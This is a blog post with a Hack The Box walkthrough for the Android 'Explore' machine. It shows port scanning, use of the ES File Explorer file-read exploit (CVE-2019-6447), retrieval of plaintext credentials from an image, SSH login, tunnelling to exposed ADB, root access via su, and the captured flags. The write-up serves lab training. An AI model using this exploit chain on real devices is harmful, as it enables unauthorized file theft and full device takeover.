<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hackthebox - Explore" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="/posts/htb-explore-post/" /><meta property="og:url" content="/posts/htb-explore-post/" /><meta property="og:site_name" content="Hackthebox" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-11T00:00:00+12:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox - Explore" /><meta name="twitter:site" content="@kabeallu" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Enumeration","headline":"Hackthebox - Explore","dateModified":"2021-09-12T03:12:33+12:00","datePublished":"2021-09-11T00:00:00+12:00","url":"/posts/htb-explore-post/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-explore-post/"},"@context":"https://schema.org"}</script><title>Hackthebox - Explore | Hackthebox</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hackthebox"><meta name="application-name" content="Hackthebox"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://raw.githubusercontent.com/kabeallu/karl/gh-pages/assets/img/favicons/android-chrome-256x256.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hackthebox</a></div><div class="site-subtitle font-italic">Notes and guides for HTTB</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/kabeallu" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/kabeallu" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['kabeallu','cryptocrazy.co.nz'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Explore</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Explore</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> kabeallu </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 12:00 AM +1200" >Sep 11<i class="unloaded">2021-09-11T00:00:00+12:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 11:12 AM -0400" >Sep 11<i class="unloaded">2021-09-12T03:12:33+12:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1928 words">10 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-proofer-ignore data-src="/path/to/image/file" class="preview-img" alt="image alternative text" width="1000" height="400"><h1 id="enumeration">Enumeration</h1><p>Use nmap to find ports and services running on the target machines</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
</pre><td class="rouge-code"><pre>nmap -T4 -sC -sV -p- -Pn -oN nmap.log 10.10.10.247
Warning: 10.10.10.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.247
Host is up (0.091s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
44115/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:00:45 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 10 Sep 2021 18:00:45 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 10 Sep 2021 18:00:50 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:00:50 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????&lt;=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 10 Sep 2021 18:01:06 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=9/10%Time=613B9CFB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44115-TCP:V=7.91%I=7%D=9/10%Time=613B9CFA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:10\x20Sep\x202021\x2018:00:45\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x2018:0
SF:0:45\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x
SF:2018:00:50\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2010\x20Sep\x202021\x2018:00:50\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2010\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2010\x20Sep\x
SF:202021\x2018:01:06\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x201
SF:0\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2010\x20Sep\x202021\x2018:01:06\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
</pre></table></code></div></div><h2 id="user-flag">User Flag</h2><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://10.10.10.247:59777 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
</pre></table></code></div></div><p>Nothing much here!!</p><p>After searching around the net for a Minecraft exploit I decided to try searching for ES File Explorer Name Response httpd, After a few miniets searching I found (ES File Explorer 4.1.9.7.4 - Arbitrary File Read) on dbexploit website.</p><p>Save the python script and execute the following to list files.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
</pre><td class="rouge-code"><pre>python3 ES-File-Explorer-Open-Port-Vulnerability.py listFiles 10.10.10.247


==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : lib
time : 3/25/20 05:12:02 AM
type : folder
size : 12.00 KB (12,288 Bytes)

name : vndservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 65.00 Bytes (65 Bytes)

name : vendor_service_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_seapp_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_property_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 392.00 Bytes (392 Bytes)

name : vendor_hwservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 0.00 Bytes (0 Bytes)

name : vendor_file_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 6.92 KB (7,081 Bytes)

name : vendor
time : 3/25/20 12:12:33 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : ueventd.rc
time : 9/10/21 09:10:57 AM
type : file
size : 5.00 KB (5,122 Bytes)

name : ueventd.android_x86_64.rc
time : 9/10/21 09:10:57 AM
type : file
size : 464.00 Bytes (464 Bytes)

name : system
time : 3/25/20 12:12:31 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : sys
time : 9/10/21 09:10:57 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : storage
time : 9/10/21 09:11:03 AM
type : folder
size : 80.00 Bytes (80 Bytes)

name : sepolicy
time : 9/10/21 09:10:57 AM
type : file
size : 357.18 KB (365,756 Bytes)

name : sdcard
time : 4/21/21 02:12:29 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : sbin
time : 9/10/21 09:10:57 AM
type : folder
size : 140.00 Bytes (140 Bytes)

name : product
time : 3/24/20 11:39:17 PM
type : folder
size : 4.00 KB (4,096 Bytes)

name : proc
time : 9/10/21 09:10:56 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : plat_service_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 13.73 KB (14,057 Bytes)

name : plat_seapp_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 1.28 KB (1,315 Bytes)

name : plat_property_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 6.53 KB (6,687 Bytes)

name : plat_hwservice_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 7.04 KB (7,212 Bytes)

name : plat_file_contexts
time : 9/10/21 09:10:57 AM
type : file
size : 23.30 KB (23,863 Bytes)

name : oem
time : 9/10/21 09:10:57 AM
type : folder
size : 40.00 Bytes (40 Bytes)

name : odm
time : 9/10/21 09:10:57 AM
type : folder
size : 220.00 Bytes (220 Bytes)

name : mnt
time : 9/10/21 09:10:58 AM
type : folder
size : 240.00 Bytes (240 Bytes)

name : init.zygote64_32.rc
time : 9/10/21 09:10:57 AM
type : file
size : 875.00 Bytes (875 Bytes)

name : init.zygote32.rc
time : 9/10/21 09:10:57 AM
type : file
size : 511.00 Bytes (511 Bytes)

name : init.usb.rc
time : 9/10/21 09:10:57 AM
type : file
size : 5.51 KB (5,646 Bytes)

name : init.usb.configfs.rc
time : 9/10/21 09:10:57 AM
type : file
size : 7.51 KB (7,690 Bytes)

name : init.superuser.rc
time : 9/10/21 09:10:57 AM
type : file
size : 582.00 Bytes (582 Bytes)

name : init.rc
time : 9/10/21 09:10:57 AM
type : file
size : 29.00 KB (29,697 Bytes)

name : init.environ.rc
time : 9/10/21 09:10:57 AM
type : file
size : 1.04 KB (1,064 Bytes)

name : init.android_x86_64.rc
time : 9/10/21 09:10:57 AM
type : file
size : 3.36 KB (3,439 Bytes)

name : init
time : 9/10/21 09:10:57 AM
type : file
size : 2.29 MB (2,401,264 Bytes)

name : fstab.android_x86_64
time : 9/10/21 09:10:57 AM
type : file
size : 753.00 Bytes (753 Bytes)

name : etc
time : 3/25/20 03:41:52 AM
type : folder
size : 4.00 KB (4,096 Bytes)

name : dev
time : 9/10/21 09:11:00 AM
type : folder
size : 2.64 KB (2,700 Bytes)

name : default.prop
time : 9/10/21 09:10:57 AM
type : file
size : 1.09 KB (1,118 Bytes)

name : data
time : 3/15/21 04:49:09 PM
type : folder
size : 4.00 KB (4,096 Bytes)

name : d
time : 9/10/21 09:10:56 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : config
time : 9/10/21 09:10:58 AM
type : folder
size : 0.00 Bytes (0 Bytes)

name : charger
time : 12/31/69 07:00:00 PM
type : file
size : 0.00 Bytes (0 Bytes)

name : cache
time : 9/10/21 09:10:58 AM
type : folder
size : 120.00 Bytes (120 Bytes)

name : bugreports
time : 12/31/69 07:00:00 PM
type : file
size : 0.00 Bytes (0 Bytes)

name : bin
time : 3/25/20 12:26:22 AM
type : folder
size : 8.00 KB (8,192 Bytes)

name : acct
time : 9/10/21 09:10:57 AM
type : folder
size : 0.00 Bytes (0 Bytes)
</pre></table></code></div></div><p>After searching around I found storage/emulated/0/DCIM/creds.jpg</p><p>Download the jpg</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget http://10.10.10.247:59777/storage/emulated/0/DCIM/creds.jpg  
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/walkthroughs/explore/creds.jpg" alt="" /></p><p>Using those credentials ssh into the machine</p><ul><li>user kristi<li>pass Kr1sT!5h@Rp3xPl0r3! ``` ssh kristi@10.10.10.247 -p 2222</ul><p>Password authentication Password: :/ $ cd sdcard :/sdcard $ ls Alarms DCIM Movies Notifications Podcasts backups user.txt Android Download Music Pictures Ringtones dianxinos :/sdcard $ cat user.txt f32017174c7c7e8f50c6da52891ae250</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Submit the user flag to hackthebox, Congratulations.

## Root Flag

While we are still connected through SSH, Check listening ports
</pre></table></code></div></div><p>netstat -l Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State <br /> tcp6 0 0 localhost:36217 :::* LISTEN <br /> tcp6 0 0 :::59777 :::* LISTEN <br /> tcp6 0 0 ::ffff:10.10.10.2:35405 :::* LISTEN <br /> tcp6 0 0 :::2222 :::* LISTEN <br /> tcp6 0 0 :::5555 :::* LISTEN <br /> tcp6 0 0 :::42135 :::* LISTEN</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Port 5555 is open, Using ssh tunneling

</pre></table></code></div></div><p>ssh -L 5555:127.0.0.1:5555 -N -f kristi@10.10.10.247 -p 2222</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>
Then

</pre></table></code></div></div><p>adb connect 127.0.0.1:5555</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>
</pre></table></code></div></div><p>adb shell <br /> x86_64:/ $ su :/ # id uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0 :/ # ls acct init.superuser.rc sbin <br /> bin init.usb.configfs.rc sdcard <br /> bugreports init.usb.rc sepolicy <br /> cache init.zygote32.rc storage <br /> charger init.zygote64_32.rc sys <br /> config lib system <br /> d mnt ueventd.android_x86_64.rc data odm ueventd.rc <br /> default.prop oem vendor <br /> dev plat_file_contexts vendor_file_contexts <br /> etc plat_hwservice_contexts vendor_hwservice_contexts fstab.android_x86_64 plat_property_contexts vendor_property_contexts<br /> init plat_seapp_contexts vendor_seapp_contexts <br /> init.android_x86_64.rc plat_service_contexts vendor_service_contexts <br /> init.environ.rc proc vndservice_contexts <br /> init.rc product <br /> :/ # cd data :/data # ls adb bootchart media property tombstones anr cache mediadrm resource-cache user <br /> app dalvik-cache misc root.txt user_de <br /> app-asec data misc_ce ss vendor <br /> app-ephemeral drm misc_de ssh_starter.sh vendor_ce<br /> app-lib es_starter.sh nfc system vendor_de<br /> app-private local ota system_ce <br /> backup lost+found ota_package system_de <br /> :/data # cat root.txt f04fc82b6d49b41c9b08982be59338c5 ```</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/machines/'>machines</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Explore - Hackthebox&url=/posts/htb-explore-post/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Explore - Hackthebox&u=/posts/htb-explore-post/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox - Explore - Hackthebox&url=/posts/htb-explore-post/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-explore-post/">Hackthebox - Explore</a><li><a href="/posts/htb-cap/">Hackthebox - Cap</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-cap/"><div class="card-body"> <span class="timeago small" >Sep 11<i class="unloaded">2021-09-11T00:00:00+12:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox - Cap</h3><div class="text-muted small"><p> Enumeration Use nmap to find ports and services running on the target machines nmap -T4 -sC -sV -p- -Pn -oN nmap.log 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up (0.086s latency). No...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-cap/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox - Cap</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Comments powered by <a 